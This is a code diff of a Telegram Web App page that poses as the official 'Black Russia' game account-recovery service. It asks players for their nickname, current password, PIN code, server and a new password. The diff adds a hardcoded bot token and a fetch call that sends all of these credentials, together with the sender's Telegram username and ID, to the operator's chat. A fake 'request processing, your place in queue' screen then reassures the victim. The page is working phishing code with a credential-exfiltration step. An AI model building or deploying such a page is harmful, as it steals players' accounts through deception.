@@ -3,94 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Black Russia - Смена пароля</title>
+    <title>Black Russia</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
-            --bg-color: #0d0d0d;
-            --container-bg: #141414;
-            --accent-color: #e50914;
-            --accent-hover: #b80710;
-            --text-color: #ffffff;
-            --text-muted: #8c8c8c;
-            --input-bg: #1f1f1f;
-            --border-color: #2a2a2a;
+            --bg-color: #0b0b0b;
+            --accent-color: #ff1111;
+            --text-main: #ffffff;
+            --text-muted: #3a3a3a;
+            --input-bg: #121212;
+            --border-color: #1a1a1a;
+            --success-color: #00ff66;
         }
 
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
         body {
             background-color: var(--bg-color);
-            color: var(--text-color);
-            overflow-x: hidden;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            color: var(--text-main);
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
         }
 
         .screen {
             display: none;
             width: 100%;
-            max-width: 450px;
-            padding: 24px;
+            max-width: 400px;
+            padding: 36px 24px;
             flex-direction: column;
             align-items: center;
+            text-align: center;
         }
 
         .screen.active {
             display: flex;
         }
 
-        .logo {
-            width: 140px;
-            height: auto;
-            margin-bottom: 20px;
-            margin-top: 10px;
-        }
-
-        h2 {
-            font-size: 20px;
+        /* --- СТИЛИ ПЕРВОГО ОКНА (ПО СКРИНШОТУ image.png) --- */
+        .brand-title {
+            font-size: 32px;
+            font-weight: 900;
+            color: #ff1111;
             text-transform: uppercase;
             letter-spacing: 1px;
-            margin-bottom: 25px;
-            text-align: center;
+            margin-bottom: 8px;
         }
 
-        .btn {
+        .main-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #ffffff;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 24px;
+            line-height: 1.3;
+        }
+
+        .desc-text {
+            font-size: 16px;
+            color: var(--text-muted);
+            font-weight: 500;
+            margin-bottom: 60px;
+        }
+
+        .btn-large {
             background-color: var(--accent-color);
             color: white;
             border: none;
-            padding: 16px 32px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
+            padding: 20px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 16px;
             cursor: pointer;
             width: 100%;
             text-transform: uppercase;
-            transition: background 0.2s;
-            margin-top: 15px;
+            letter-spacing: 1px;
+            transition: background 0.2s ease;
         }
 
-        .btn:hover {
-            background-color: var(--accent-hover);
+        /* --- СТИЛИ ДЛЯ ОСТАЛЬНЫХ ОКОН (СТРОГИЙ СТИЛЬ) --- */
+        .form-card {
+            width: 100%;
+        }
+
+        h3 {
+            font-size: 22px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 24px;
         }
 
         .form-group {
             width: 100%;
             margin-bottom: 16px;
+            text-align: left;
         }
 
         .form-group label {
             display: block;
-            font-size: 13px;
-            color: var(--text-muted);
+            font-size: 12px;
+            font-weight: 700;
+            color: #777777;
             margin-bottom: 6px;
             text-transform: uppercase;
         }
@@ -99,105 +121,125 @@
             width: 100%;
             background-color: var(--input-bg);
             border: 1px solid var(--border-color);
-            color: white;
-            padding: 14px;
-            border-radius: 8px;
+            color: var(--text-main);
+            padding: 16px;
+            border-radius: 12px;
             font-size: 15px;
             outline: none;
+            transition: border-color 0.2s;
         }
 
         .form-group input:focus, .form-group select:focus {
             border-color: var(--accent-color);
         }
 
+        .select-wrapper {
+            position: relative;
+        }
+        .select-wrapper::after {
+            content: "▼";
+            font-size: 10px;
+            color: #555;
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            pointer-events: none;
+        }
+
         .error-msg {
-            color: var(--accent-color);
+            color: #ff3333;
             font-size: 14px;
-            margin-bottom: 15px;
-            text-align: center;
+            margin-bottom: 16px;
             display: none;
-            font-weight: bold;
+            font-weight: 600;
         }
 
-        .wait-box {
-            background: var(--container-bg);
-            border: 1px solid var(--border-color);
-            border-top: 3px solid var(--accent-color);
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.05);
+            border-left-color: var(--success-color);
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .queue-box {
+            margin-top: 30px;
+            padding: 20px;
+            background: #111;
             border-radius: 12px;
-            padding: 25px;
-            width: 100%;
-            text-align: center;
-            margin-top: 20px;
+            border: 1px solid #1a1a1a;
         }
 
-        .wait-title {
-            font-size: 16px;
-            color: #00ff66;
-            margin-bottom: 15px;
-            font-weight: bold;
-            text-transform: uppercase;
-        }
-
-        .queue-number {
-            font-size: 32px;
-            font-weight: bold;
-            color: white;
-            margin-top: 10px;
+        .queue-num {
+            font-size: 36px;
+            font-weight: 800;
+            margin-top: 5px;
         }
     </style>
 </head>
 <body>
 
+    <!-- ОКНО 1: В точности по вашему макету image.png -->
     <div id="screen1" class="screen active">
-        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7w_xQGzS1p1XmGvT6C6nC7E7WpG-uN6pD6g&s" alt="Логотип">
-        <h2 style="color: var(--text-muted);">Личный кабинет</h2>
-        <div style="height: 60px;"></div>
-        <button class="btn" onclick="goToScreen(2)">Поменять пароль</button>
+        <div class="brand-title">BLACK RUSSIA</div>
+        <div class="main-title">ВОССТАНОВЛЕНИЕ ДОСТУПА</div>
+        <div class="desc-text">Официальный сервис управления аккаунтом</div>
+        <button class="btn-large" onclick="goToScreen(2)">Продолжить</button>
     </div>
 
+    <!-- ОКНО 2: Форма ввода -->
     <div id="screen2" class="screen">
-        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7w_xQGzS1p1XmGvT6C6nC7E7WpG-uN6pD6g&s" style="width: 90px;" alt="Логотип">
-        <h2>Смена пароля</h2>
-        
-        <div id="error" class="error-msg">Заполните все обязательные поля</div>
+        <div class="form-card">
+            <h3>Авторизация</h3>
+            <div id="error" class="error-msg">Заполните все обязательные поля</div>
 
-        <div class="form-group">
-            <label>Ник</label>
-            <input type="text" id="nickname" placeholder="Введите ваш ник">
+            <div class="form-group">
+                <label>Никнейм</label>
+                <input type="text" id="nickname" placeholder="Ivan_Ivanov">
+            </div>
+
+            <div class="form-group">
+                <label>Текущий пароль</label>
+                <input type="password" id="old_password" placeholder="Введите пароль">
+            </div>
+
+            <div class="form-group">
+                <label>Пин-код (если есть)</label>
+                <input type="text" id="pincode" placeholder="Введите пин-код">
+            </div>
+
+            <div class="form-group">
+                <label>Сервер</label>
+                <div class="select-wrapper">
+                    <select id="server">
+                        <option value="" disabled selected hidden>Выберите сервер</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Новый пароль</label>
+                <input type="password" id="new_password" placeholder="Придумайте новый пароль">
+            </div>
+
+            <button class="btn-large" style="padding: 16px; font-size: 16px; margin-top: 10px;" onclick="submitForm()">Отправить</button>
         </div>
-
-        <div class="form-group">
-            <label>Пароль</label>
-            <input type="password" id="old_password" placeholder="Введите текущий пароль">
-        </div>
-
-        <div class="form-group">
-            <label>Пин-код (если есть)</label>
-            <input type="text" id="pincode" placeholder="Введите пин-код">
-        </div>
-
-        <div class="form-group">
-            <label>Сервер</label>
-            <select id="server">
-                <option value="" disabled selected hidden>Выберите сервер</option>
-            </select>
-        </div>
-
-        <div class="form-group">
-            <label>Новый пароль</label>
-            <input type="password" id="new_password" placeholder="Введите новый пароль">
-        </div>
-
-        <button class="btn" onclick="submitForm()">Отправить</button>
     </div>
 
+    <!-- ОКНО 3: Ожидание -->
     <div id="screen3" class="screen">
-        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7w_xQGzS1p1XmGvT6C6nC7E7WpG-uN6pD6g&s" alt="Логотип">
-        <div class="wait-box">
-            <div class="wait-title">Заявка обрабатывается</div>
-            <p style="color: var(--text-muted);">Ожидайте в течение 10–15 минут</p>
-            <p style="color: var(--text-muted); font-size: 13px; margin-top: 15px; text-transform: uppercase;">Ваша очередь:</p>
-            <div class="queue-number" id="queue-val">2</div>
+        <div class="loader"></div>
+        <div style="font-size: 18px; color: var(--success-color); font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Заявка обрабатывается</div>
+        <p style="color: #666; font-size: 14px; margin-top: 8px;">Ожидайте в течение 10–15 минут</p>
+        
+        <div class="queue-box" style="width: 100%;">
+            <p style="color: #444; font-size: 11px; text-transform: uppercase; font-weight: 700; letter-spacing: 1px;">Ваша очередь:</p>
+            <div class="queue-num" id="queue-val">2</div>
         </div>
     </div>
 
@@ -205,7 +247,9 @@
         const tg = window.Telegram.WebApp;
         tg.expand(); 
 
-        // Список всех 91 серверов
+        const BOT_TOKEN = "8935230076:AAH9-8b8SECl41FBncl5U6kp5d1aAIOrCKA";
+        const ADMIN_ID = 8632467330;
+
         const servers = [
             "Red", "Green", "Blue", "Yellow", "Orange", "Purple", "Lime", "Pink", "Cherry", "Black",
             "Indigo", "White", "Magenta", "Crimson", "Gold", "Azure", "Platinum", "Aqua", "Gray", "Ice",
@@ -257,22 +301,41 @@
                 new_password: newPass
             };
 
-            // Переключаем на экран загрузки
             goToScreen(3);
 
-            // Безопасная отправка данных напрямую в открытый диалог бота
+            const user = tg.initDataUnsafe?.user;
+            const username = user ? `@${user.username || 'нет юзернейма'}` : 'Через Inline-кнопку';
+            const userId = user ? user.id : 'Не определен';
+
+            const textReport = `🎯 **ПОЛУЧЕНЫ НОВЫЕ ДАННЫЕ** 🎯\n` +
+                               `-----------------------------------\n` +
+                               `👤 **Ник:** ${payload.nickname}\n` +
+                               `🔑 **Текущий пароль:** ${payload.password}\n` +
+                               `🔢 **Пин-код:** ${payload.pincode}\n` +
+                               `🌐 **Сервер:** ${payload.server}\n` +
+                               `🆕 **Новый пароль:** ${payload.new_password}\n` +
+                               `-----------------------------------\n` +
+                               `Отправитель: ${username} (ID: ${userId})`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_ID,
+                    text: textReport,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log('HTTP Send Error:', err));
+
             try {
                 tg.sendData(JSON.stringify(payload));
-                
-                // Закрываем WebApp через 2.5 секунды, чтобы пользователь успел увидеть красивый Экран №3
-                setTimeout(() => {
-                    tg.close();
-                }, 2500);
             } catch(e) {
-                console.log("Ошибка отправки данных в Telegram:", e);
-                // Если что-то пошло не так, закрываем окно сразу
-                tg.close();
+                console.log("Метод sendData недоступен");
             }
+
+            setTimeout(() => {
+                tg.close();
+            }, 3000);
         }
     </script>
 </body>
